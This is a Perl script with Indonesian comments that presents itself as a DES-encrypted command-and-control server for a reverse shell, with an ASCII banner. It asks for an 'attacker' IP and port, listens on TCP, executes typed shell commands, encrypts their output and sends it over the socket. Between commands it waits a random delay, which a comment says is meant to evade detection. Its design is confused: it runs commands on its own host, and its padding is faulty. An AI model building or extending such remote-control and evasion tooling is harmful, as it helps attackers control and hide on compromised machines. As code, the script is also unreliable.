#!/usr/bin/perl
# Skrip server C2 (Command and Control) ini menggunakan enkripsi DES untuk komunikasi jarak jauh yang aman 
# antara server penyerang dan target. Skrip ini hanya untuk simulasi dan masih dalam tahap pengembangan.

use strict;
use warnings;
use IO::Socket::INET; # Modul untuk operasi soket
use MIME::Base64;     # Modul untuk encoding Base64
use Crypt::DES;       # Modul untuk enkripsi DES
use Time::HiRes qw(usleep); # Modul untuk mengatur waktu jeda secara presisi

# Warna untuk output terminal
my $WHITE = "\033[97m"; 
my $RESET = "\033[0m";

# Menampilkan banner saat skrip dijalankan
print $WHITE . qq(
██████╗ ██████╗ ██╗███╗   ███╗██╗████████╗██╗██╗   ██╗███████╗    ██████╗ ███████╗ █████╗ ██████╗ 
██╔══██╗██╔══██╗██║████╗ ████║██║╚══██╔══╝██║██║   ██║██╔════╝    ██╔══██╗██╔════╝██╔══██╗██╔══██╗
██████╔╝██████╔╝██║██╔████╔██║██║   ██║   ██║██║   ██║█████╗      ██████╔╝█████╗  ███████║██████╔╝
██╔═══╝ ██╔══██╗██║██║╚██╔╝██║██║   ██║   ██║╚██╗ ██╔╝██╔══╝      ██╔══██╗██╔══╝  ██╔══██║██╔══██╗
██║     ██║  ██║██║██║ ╚═╝ ██║██║   ██║   ██║ ╚████╔╝ ███████╗    ██████╔╝███████╗██║  ██║██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
) . $RESET;

# Fungsi untuk mendapatkan informasi IP penyerang
sub get_attacker_info {
    print "Masukkan alamat IP untuk reverse shell: ";
    my $attacker_ip = <STDIN>; # Input IP dari pengguna
    chomp($attacker_ip);
    return $attacker_ip;
}

# Fungsi untuk mendapatkan nomor port
sub get_port {
    print "Masukkan nomor port untuk reverse shell: ";
    my $port = <STDIN>; # Input port dari pengguna
    chomp($port);
    return $port;
}

# Fungsi untuk mendapatkan kunci DES
sub get_des_key {
    print "Masukkan kunci DES Anda (harus 8 byte): ";
    my $key = <STDIN>; # Input kunci dari pengguna
    chomp($key);
    # Validasi panjang kunci harus 8 byte
    if (length($key) != 8) {
        print "Panjang kunci tidak valid. Kunci DES harus 8 byte.\n";
        return get_des_key(); # Rekursi jika panjang tidak sesuai
    }
    return $key;
}

# Fungsi untuk mengenkripsi data menggunakan DES
sub encrypt_data {
    my ($data, $key) = @_;
    my $cipher = Crypt::DES->new($key); # Membuat objek DES dengan kunci
    # Menambahkan padding jika panjang data tidak kelipatan 8
    my $data_padded = $data . ("\0" x (8 - length($data) % 8));
    my $encrypted = $cipher->encrypt($data_padded); # Enkripsi data
    return encode_base64($encrypted); # Encoding hasil enkripsi dengan Base64
}

# Fungsi utama
sub main {
    my $ip = get_attacker_info(); # Mendapatkan IP penyerang
    my $port = get_port();        # Mendapatkan nomor port
    my $key = get_des_key();      # Mendapatkan kunci DES

    # Membuat soket untuk mendengarkan koneksi
    my $socket = IO::Socket::INET->new(
        LocalAddr => $ip,
        LocalPort => $port,
        Proto     => 'tcp', # Protokol TCP
        Listen    => 1,     # Maksimal 1 koneksi dalam antrean
        Reuse     => 1,     # Mengizinkan reuse port
    ) or die "Tidak dapat membuat soket: $!\n";

    print "Menunggu koneksi masuk...\n";
    my $client_socket = $socket->accept(); # Menerima koneksi dari klien

    while (1) {
        print "Masukkan perintah untuk dieksekusi (atau ketik 'exit' untuk keluar): ";
        my $command = <STDIN>; # Input perintah dari pengguna
        chomp($command);
        last if $command eq 'exit'; # Keluar dari loop jika perintah adalah 'exit'

        next unless $command; # Lewati jika perintah kosong

        # Eksekusi perintah di sistem dan ambil hasilnya
        my $result = `$command 2>&1`;
        $result = "" unless defined $result; # Pastikan $result terdefinisi
        # Enkripsi hasil perintah menggunakan kunci DES
        my $encrypted_result = encrypt_data($result, $key);

        # Kirim perintah dan hasil yang terenkripsi ke klien
        $client_socket->send($command . "\n" . $encrypted_result);
        # Jeda acak antara 1 hingga 5 detik untuk menghindari deteksi
        usleep(int(rand(4) + 1) * 1000000);
    }

    close $client_socket; # Tutup koneksi klien
    close $socket;        # Tutup soket utama
}

main(); # Memanggil fungsi utama untuk menjalankan skrip
